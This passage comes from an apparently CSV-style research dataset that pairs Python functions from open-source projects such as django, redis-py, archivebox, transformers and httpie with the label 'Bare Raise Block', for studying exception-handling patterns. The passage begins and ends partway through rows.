                 image_href='', sound_href='', duration=1000,
                 special_text_color='',
                 amount=0, currency='USD', name='Anon',
                 identifier='Apprise',
                 **kwargs):
        """"""
        Initialize Streamlabs Object

        """"""
        super().__init__(**kwargs)

        # access token is generated by user
        # using https://streamlabs.com/api/v1.0/token
        # Tokens for Streamlabs never need to be refreshed.
        self.access_token = validate_regex(
            access_token,
            *self.template_tokens['access_token']['regex']
        )
        if not self.access_token:
            msg = 'An invalid Streamslabs access token was specified.'
            self.logger.warning(msg)
            raise TypeError(msg)

        # Store the call
        try:
            if call not in STRMLABS_CALLS:
                # allow the outer except to handle this common response
                raise
            else:
                self.call = call
        except Exception as e:
            # Invalid region specified
            msg = 'The streamlabs call specified ({}) is invalid.' \
                .format(call)
            self.logger.warning(msg)
            self.logger.debug('Socket Exception: %s' % str(e))
            raise TypeError(msg)

        # Store the alert_type
        # only applicable when calling /alerts
        try:
            if alert_type not in STRMLABS_ALERTS:
                # allow the outer except to handle this common response
                raise
            else:
                self.alert_type = alert_type
        except Exception as e:
            # Invalid region specified
            msg = 'The streamlabs alert type specified ({}) is invalid.' \
                .format(call)
            self.logger.warning(msg)
            self.logger.debug('Socket Exception: %s' % str(e))
            raise TypeError(msg)

        # params only applicable when calling /alerts
        self.image_href = image_href
        self.sound_href = sound_href
        self.duration = duration
        self.special_text_color = special_text_color

        # only applicable when calling /donations
        # The amount of this donation.
        self.amount = amount

        # only applicable when calling /donations
        # The 3 letter currency code for this donation.
        # Must be one of the supported currency codes.
        self.currency = validate_regex(
            currency,
            *self.template_args['currency']['regex']
        )

        # only applicable when calling /donations
        if not self.currency:
            msg = 'An invalid Streamslabs currency was specified.'
            self.logger.warning(msg)
            raise TypeError(msg)

        # only applicable when calling /donations
        # The name of the donor
        self.name = validate_regex(
            name,
            *self.template_args['name']['regex']
        )
        if not self.name:
            msg = 'An invalid Streamslabs donor was specified.'
            self.logger.warning(msg)
            raise TypeError(msg)

        # An identifier for this donor,
        # which is used to group donations with the same donor.
        # only applicable when calling /donations
        self.identifier = identifier

        return",Bare Raise Block,1
115,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/packages/all/pupyutils/basic_cmds.py,rm,"def rm(path):
    path = try_unicode(path)
    path = os.path.expanduser(path)
    path = os.path.expandvars(path)

    files = 0
    exception = None

    for path in glob.iglob(path):
        if os.path.exists(path):
            files += 1
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
            else:
                try:
                    os.remove(path)
                except OSError, e:
                    exception = e
        else:
            raise ValueError(""File/directory does not exists"")

    if not files:
        raise ValueError(""File/directory does not exists"")

    if files == 1 and exception:
        try_exc_utf8(exception)
        raise",Bare Raise Block,1
116,localstack,/home/r4ph/desenv/exception-miner/projects/py/localstack/localstack/services/cloudformation/models/stepfunctions.py,_apply_substitutions,"def _apply_substitutions(definition: str, substitutions: Dict[str, str]) -> str:
    substitution_regex = re.compile(""\\${[a-zA-Z0-9_]+}"")  # might be a bit too strict in some cases
    tokens = substitution_regex.findall(definition)
    result = definition
    for token in tokens:
        raw_token = token[2:-1]  # strip ${ and }
        if raw_token not in substitutions.keys():
            raise
        result = result.replace(token, substitutions[raw_token])

    return result",Bare Raise Block,1
117,django,/home/r4ph/desenv/exception-miner/projects/py/django/django/utils/decorators.py,_make_decorator,"def _make_decorator(*m_args, **m_kwargs):
        def _decorator(view_func):
            middleware = middleware_class(view_func, *m_args, **m_kwargs)

            def _pre_process_request(request, *args, **kwargs):
                if hasattr(middleware, ""process_request""):
                    result = middleware.process_request(request)
                    if result is not None:
                        return result
                if hasattr(middleware, ""process_view""):
                    result = middleware.process_view(request, view_func, args, kwargs)
                    if result is not None:
                        return result
                return None

            def _process_exception(request, exception):
                if hasattr(middleware, ""process_exception""):
                    result = middleware.process_exception(request, exception)
                    if result is not None:
                        return result
                raise

            def _post_process_request(request, response):
                if hasattr(response, ""render"") and callable(response.render):
                    if hasattr(middleware, ""process_template_response""):
                        response = middleware.process_template_response(
                            request, response
                        )
                    # Defer running of process_response until after the template
                    # has been rendered:
                    if hasattr(middleware, ""process_response""):

                        def callback(response):
                            return middleware.process_response(request, response)

                        response.add_post_render_callback(callback)
                else:
                    if hasattr(middleware, ""process_response""):
                        return middleware.process_response(request, response)
                return response

            if iscoroutinefunction(view_func):

                async def _view_wrapper(request, *args, **kwargs):
                    result = _pre_process_request(request, *args, **kwargs)
                    if result is not None:
                        return result

                    try:
                        response = await view_func(request, *args, **kwargs)
                    except Exception as e:
                        result = _process_exception(request, e)
                        if result is not None:
                            return result

                    return _post_process_request(request, response)

            else:

                def _view_wrapper(request, *args, **kwargs):
                    result = _pre_process_request(request, *args, **kwargs)
                    if result is not None:
                        return result

                    try:
                        response = view_func(request, *args, **kwargs)
                    except Exception as e:
                        result = _process_exception(request, e)
                        if result is not None:
                            return result

                    return _post_process_request(request, response)

            return wraps(view_func)(_view_wrapper)

        return _decorator",Bare Raise Block,1
118,redis-py,/home/r4ph/desenv/phd/exception-miner/projects/py/redis-py/redis/client.py,_disconnect_reset_raise,"def _disconnect_reset_raise(self, conn, error) -> None:
        """"""
        Close the connection, reset watching state and
        raise an exception if we were watching,
        retry_on_timeout is not set,
        or the error is not a TimeoutError
        """"""
        conn.disconnect()
        # if we were already watching a variable, the watch is no longer
        # valid since this connection has died. raise a WatchError, which
        # indicates the user should retry this transaction.
        if self.watching:
            self.reset()
            raise WatchError(
                ""A ConnectionError occurred on while watching one or more keys""
            )
        # if retry_on_timeout is not set, or the error is not
        # a TimeoutError, raise it
        if not (conn.retry_on_timeout and isinstance(error, TimeoutError)):
            self.reset()
            raise",Bare Raise Block,1
119,sanic,/home/r4ph/desenv/exception-miner/projects/py/sanic/tests/test_named_routes.py,test_versioned_named_routes_get,"def test_versioned_named_routes_get(method):
    app = Sanic(""app"")

    bp = Blueprint(""test_bp"", url_prefix=""/bp"")

    method = method.lower()
    route_name = f""route_{method}""
    route_name2 = f""route2_{method}""

    func = getattr(app, method)
    if callable(func):

        @func(f""/{method}"", version=1, name=route_name)
        def handler(request):
            return text(""OK"")

    else:
        raise

    func = getattr(bp, method)
    if callable(func):

        @func(f""/{method}"", version=1, name=route_name2)
        def handler2(request):
            return text(""OK"")

    else:
        raise

    app.blueprint(bp)

    assert (
        app.router.routes_all[
            (
                ""v1"",
                method,
            )
        ].name
        == f""app.{route_name}""
    )

    route = app.router.routes_all[
        (
            ""v1"",
            ""bp"",
            method,
        )
    ]
    assert route.name == f""app.test_bp.{route_name2}""

    assert app.url_for(route_name) == f""/v1/{method}""
    url = app.url_for(f""test_bp.{route_name2}"")
    assert url == f""/v1/bp/{method}""
    with pytest.raises(URLBuildError):
        app.url_for(""handler"")",Bare Raise Block,1
120,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.5.4/.pybuild/cpython3_3.8_archivebox/build/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
121,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/pegasus_x/test_modeling_pegasus_x.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
122,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.6.2/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
123,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/mbart/test_modeling_mbart.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
124,mindsdb,/home/r4ph/desenv/phd/exception-miner/projects/py/mindsdb/mindsdb/utilities/functions.py,get_versions_where_predictors_become_obsolete,"def get_versions_where_predictors_become_obsolete():
    """""" Get list of MindsDB versions in which predictors should be retrained
        Returns:
            list of str or False
    """"""
    versions_for_updating_predictors = []
    try:
        try:
            res = requests.get(
                'https://mindsdb-cloud-public-service-files.s3.us-east-2.amazonaws.com/version_for_updating_predictors.txt',
                timeout=0.5
            )
        except (ConnectionError, requests.exceptions.ConnectionError) as e:
            print(f'Is no connection. {e}')
            raise
        except Exception as e:
            print(f'Is something wrong with getting version_for_updating_predictors.txt: {e}')
            raise

        if res.status_code != 200:
            print(f'Cant get version_for_updating_predictors.txt: returned status code = {res.status_code}')
            raise

        try:
            versions_for_updating_predictors = res.text.replace(' \t\r', '').split('\n')
        except Exception as e:
            print(f'Cant decode version_for_updating_predictors.txt: {e}')
            raise
    except Exception:
        return False, versions_for_updating_predictors

    versions_for_updating_predictors = [x for x in versions_for_updating_predictors if len(x) > 0]
    return True, versions_for_updating_predictors",Bare Raise Block,1
125,httpie,/home/r4ph/desenv/exception-miner/projects/py/httpie/httpie/core.py,raw_main,"def raw_main(
    parser: argparse.ArgumentParser,
    main_program: Callable[[argparse.Namespace, Environment], ExitStatus],
    args: List[Union[str, bytes]] = sys.argv,
    env: Environment = Environment(),
    use_default_options: bool = True,
) -> ExitStatus:
    program_name, *args = args
    env.program_name = os.path.basename(program_name)
    args = decode_raw_args(args, env.stdin_encoding)

    if is_daemon_mode(args):
        return run_daemon_task(env, args)

    plugin_manager.load_installed_plugins(env.config.plugins_dir)

    if use_default_options and env.config.default_options:
        args = env.config.default_options + args

    include_debug_info = '--debug' in args
    include_traceback = include_debug_info or '--traceback' in args

    def handle_generic_error(e, annotation=None):
        msg = str(e)
        if hasattr(e, 'request'):
            request = e.request
            if hasattr(request, 'url'):
                msg = (
                    f'{msg} while doing a {request.method}'
                    f' request to URL: {request.url}'
                )
        if annotation:
            msg += annotation
        env.log_error(f'{type(e).__name__}: {msg}')
        if include_traceback:
            raise

    if include_debug_info:
        print_debug_info(env)
        if args == ['--debug']:
            return ExitStatus.SUCCESS

    exit_status = ExitStatus.SUCCESS

    try:
        parsed_args = parser.parse_args(
            args=args,
            env=env,
        )
    except NestedJSONSyntaxError as exc:
        env.stderr.write(str(exc) + ""\n"")
        if include_traceback:
            raise
        exit_status = ExitStatus.ERROR
    except KeyboardInterrupt:
        env.stderr.write('\n')
        if include_traceback:
            raise
        exit_status = ExitStatus.ERROR_CTRL_C
    except SystemExit as e:
        if e.code != ExitStatus.SUCCESS:
            env.stderr.write('\n')
            if include_traceback:
                raise
            exit_status = ExitStatus.ERROR
    else:
        check_updates(env)
        try:
            exit_status = main_program(
                args=parsed_args,
                env=env,
            )
        except KeyboardInterrupt:
            env.stderr.write('\n')
            if include_traceback:
                raise
            exit_status = ExitStatus.ERROR_CTRL_C
        except SystemExit as e:
            if e.code != ExitStatus.SUCCESS:
                env.stderr.write('\n')
                if include_traceback:
                    raise
                exit_status = ExitStatus.ERROR
        except requests.Timeout:
            exit_status = ExitStatus.ERROR_TIMEOUT
            env.log_error(f'Request timed out ({parsed_args.timeout}s).')
        except requests.TooManyRedirects:
            exit_status = ExitStatus.ERROR_TOO_MANY_REDIRECTS
            env.log_error(
                f'Too many redirects'
                f' (--max-redirects={parsed_args.max_redirects}).'
            )
        except requests.exceptions.ConnectionError as exc:
            annotation = None
            original_exc = unwrap_context(exc)
            if isinstance(original_exc, socket.gaierror):
                if original_exc.errno == socket.EAI_AGAIN:
                    annotation = '\nCouldn’t connect to a DNS server. Please check your connection and try again.'
                elif original_exc.errno == socket.EAI_NONAME:
                    annotation = '\nCouldn’t resolve the given hostname. Please check the URL and try again.'
                propagated_exc = original_exc
            else:
                propagated_exc = exc

            handle_generic_error(propagated_exc, annotation=annotation)
            exit_status = ExitStatus.ERROR
        except Exception as e:
            # TODO: Further distinction between expected and unexpected errors.
            handle_generic_error(e)
            exit_status = ExitStatus.ERROR

    return exit_status",Bare Raise Block,1
126,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.4.24/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    setup_django(out_dir=out_dir)
    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            raise ArchiveError('Unable to detect page title')
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
127,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.5.6/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
128,mindsdb,/home/r4ph/desenv/phd/exception-miner/projects/py/mindsdb/mindsdb/utilities/functions.py,get_versions_where_predictors_become_obsolete,"def get_versions_where_predictors_become_obsolete():
    """""" Get list of MindsDB versions in which predictors should be retrained
        Returns:
            list of str or False
    """"""
    versions_for_updating_predictors = []
    try:
        try:
            res = requests.get(
                'https://mindsdb-cloud-public-service-files.s3.us-east-2.amazonaws.com/version_for_updating_predictors.txt',
                timeout=0.5
            )
        except (ConnectionError, requests.exceptions.ConnectionError) as e:
            print(f'Is no connection. {e}')
            raise
        except Exception as e:
            print(f'Is something wrong with getting version_for_updating_predictors.txt: {e}')
            raise

        if res.status_code != 200:
            print(f'Cant get version_for_updating_predictors.txt: returned status code = {res.status_code}')
            raise

        try:
            versions_for_updating_predictors = res.text.replace(' \t\r', '').split('\n')
        except Exception as e:
            print(f'Cant decode version_for_updating_predictors.txt: {e}')
            raise
    except Exception:
        return False, versions_for_updating_predictors

    versions_for_updating_predictors = [x for x in versions_for_updating_predictors if len(x) > 0]
    return True, versions_for_updating_predictors",Bare Raise Block,1
129,numba,/home/r4ph/desenv/phd/exception-miner/projects/py/numba/numba/tests/test_exceptions.py,reraise,"def reraise():
    raise",Bare Raise Block,1
130,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.5.6/.pybuild/cpython3_3.8_archivebox/build/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
131,redis-py,/home/r4ph/desenv/phd/exception-miner/projects/py/redis-py/redis/asyncio/client.py,_disconnect_reset_raise,"async def _disconnect_reset_raise(self, conn, error):
        """"""
        Close the connection, reset watching state and
        raise an exception if we were watching,
        retry_on_timeout is not set,
        or the error is not a TimeoutError
        """"""
        await conn.disconnect()
        # if we were already watching a variable, the watch is no longer
        # valid since this connection has died. raise a WatchError, which
        # indicates the user should retry this transaction.
        if self.watching:
            await self.aclose()
            raise WatchError(
                ""A ConnectionError occurred on while watching one or more keys""
            )
        # if retry_on_timeout is not set, or the error is not
        # a TimeoutError, raise it
        if not (conn.retry_on_timeout and isinstance(error, TimeoutError)):
            await self.aclose()
            raise",Bare Raise Block,1
132,sentry,/home/r4ph/desenv/exception-miner/projects/py/sentry/src/sentry/integrations/base.py,raise_error,"def raise_error(self, exc: Exception, identity: Optional[Identity] = None) -> None:
        if isinstance(exc, ApiUnauthorized):
            raise InvalidIdentity(self.message_from_error(exc), identity=identity).with_traceback(
                sys.exc_info()[2]
            )
        elif isinstance(exc, ApiError):
            if exc.json:
                error_fields = self.error_fields_from_json(exc.json)
                if error_fields is not None:
                    raise IntegrationFormError(error_fields).with_traceback(sys.exc_info()[2])

            raise IntegrationError(self.message_from_error(exc)).with_traceback(sys.exc_info()[2])
        elif isinstance(exc, IntegrationError):
            raise
        else:
            self.logger.exception(str(exc))
            raise IntegrationError(self.message_from_error(exc)).with_traceback(sys.exc_info()[2])",Bare Raise Block,1
133,freqtrade,/home/r4ph/desenv/exception-miner/projects/py/freqtrade/freqtrade/exchange/exchange.py,_async_get_historic_ohlcv,"async def _async_get_historic_ohlcv(self, pair: str, timeframe: str,
                                        since_ms: int, candle_type: CandleType,
                                        is_new_pair: bool = False, raise_: bool = False,
                                        until_ms: Optional[int] = None
                                        ) -> OHLCVResponse:
        """"""
        Download historic ohlcv
        :param is_new_pair: used by binance subclass to allow ""fast"" new pair downloading
        :param candle_type: Any of the enum CandleType (must match trading mode!)
        """"""

        one_call = timeframe_to_msecs(timeframe) * self.ohlcv_candle_limit(
            timeframe, candle_type, since_ms)
        logger.debug(
            ""one_call: %s msecs (%s)"",
            one_call,
            arrow.utcnow().shift(seconds=one_call // 1000).humanize(only_distance=True)
        )
        input_coroutines = [self._async_get_candle_history(
            pair, timeframe, candle_type, since) for since in
            range(since_ms, until_ms or (arrow.utcnow().int_timestamp * 1000), one_call)]

        data: List = []
        # Chunk requests into batches of 100 to avoid overwelming ccxt Throttling
        for input_coro in chunks(input_coroutines, 100):

            results = await asyncio.gather(*input_coro, return_exceptions=True)
            for res in results:
                if isinstance(res, Exception):
                    logger.warning(f""Async code raised an exception: {repr(res)}"")
                    if raise_:
                        raise
                    continue
                else:
                    # Deconstruct tuple if it's not an exception
                    p, _, c, new_data, _ = res
                    if p == pair and c == candle_type:
                        data.extend(new_data)
        # Sort data again after extending the result - above calls return in ""async order""
        data = sorted(data, key=lambda x: x[0])
        return pair, timeframe, candle_type, data, self._ohlcv_partial_candle",Bare Raise Block,1
134,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/pegasus/test_modeling_pegasus.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
135,easyocr,/home/r4ph/desenv/exception-miner/projects/py/easyocr/unit_test/unit_test.py,validate_all,"def validate_all(self, results, solutions, dtypes):
        if not isinstance(results, list):
            results = [results]
        if not isinstance(solutions, list):
            solutions = [solutions]
        if not isinstance(dtypes, list):
            dtypes = [dtypes]
        
        
        validation = []
        for (result, solution, dtype) in zip(results, solutions, dtypes):
            if (not self.is_list_or_tuple(result)
                and not self.is_list_or_tuple(result)
                and not self.is_list_or_tuple(result)
                ): 
                validation.append(self.validate(result, solution, type(solution)))
            elif(self.is_list_or_tuple(result)
                and self.is_list_or_tuple(result)
                and self.is_list_or_tuple(result)
                ):
                validation.append(self.validate_all(results, solutions, type(solution)))
            else:
                raise
        return all(validation)",Bare Raise Block,1
136,psutil,/home/r4ph/desenv/phd/exception-miner/projects/py/psutil/scripts/internal/winmake.py,safe_rmtree,"def safe_rmtree(path):
        def onerror(fun, path, excinfo):
            exc = excinfo[1]
            if exc.errno != errno.ENOENT:
                raise

        existed = os.path.isdir(path)
        shutil.rmtree(path, onerror=onerror)
        if existed:
            safe_print(""rmdir -f %s"" % path)",Bare Raise Block,1
137,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.6.2/.pybuild/cpython3_3.8_archivebox/build/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
138,sanic,/home/r4ph/desenv/exception-miner/projects/py/sanic/tests/test_named_routes.py,test_versioned_named_routes_get,"def test_versioned_named_routes_get(method):
    app = Sanic(""app"")

    bp = Blueprint(""test_bp"", url_prefix=""/bp"")

    method = method.lower()
    route_name = f""route_{method}""
    route_name2 = f""route2_{method}""

    func = getattr(app, method)
    if callable(func):

        @func(f""/{method}"", version=1, name=route_name)
        def handler(request):
            return text(""OK"")

    else:
        raise

    func = getattr(bp, method)
    if callable(func):

        @func(f""/{method}"", version=1, name=route_name2)
        def handler2(request):
            return text(""OK"")

    else:
        raise

    app.blueprint(bp)

    assert (
        app.router.routes_all[
            (
                ""v1"",
                method,
            )
        ].name
        == f""app.{route_name}""
    )

    route = app.router.routes_all[
        (
            ""v1"",
            ""bp"",
            method,
        )
    ]
    assert route.name == f""app.test_bp.{route_name2}""

    assert app.url_for(route_name) == f""/v1/{method}""
    url = app.url_for(f""test_bp.{route_name2}"")
    assert url == f""/v1/bp/{method}""
    with pytest.raises(URLBuildError):
        app.url_for(""handler"")",Bare Raise Block,1
139,gunicorn,/home/r4ph/desenv/phd/exception-miner/projects/py/gunicorn/examples/websocket/websocket.py,__call__,"def __call__(self, environ, start_response):
        if not (environ.get('HTTP_CONNECTION').find('Upgrade') != -1 and
            environ['HTTP_UPGRADE'].lower() == 'websocket'):
            # need to check a few more things here for true compliance
            start_response('400 Bad Request', [('Connection','close')])
            return []

        sock = environ['gunicorn.socket']

        version = environ.get('HTTP_SEC_WEBSOCKET_VERSION')

        ws = WebSocket(sock, environ, version)

        handshake_reply = (""HTTP/1.1 101 Switching Protocols\r\n""
                   ""Upgrade: websocket\r\n""
                   ""Connection: Upgrade\r\n"")

        key = environ.get('HTTP_SEC_WEBSOCKET_KEY')
        if key:
            ws_key = base64.b64decode(key)
            if len(ws_key) != 16:
                start_response('400 Bad Request', [('Connection','close')])
                return []

            protocols = []
            subprotocols = environ.get('HTTP_SEC_WEBSOCKET_PROTOCOL')
            ws_protocols = []
            if subprotocols:
                for s in subprotocols.split(','):
                    s = s.strip()
                    if s in protocols:
                        ws_protocols.append(s)
            if ws_protocols:
                handshake_reply += 'Sec-WebSocket-Protocol: %s\r\n' % ', '.join(ws_protocols)

            exts = []
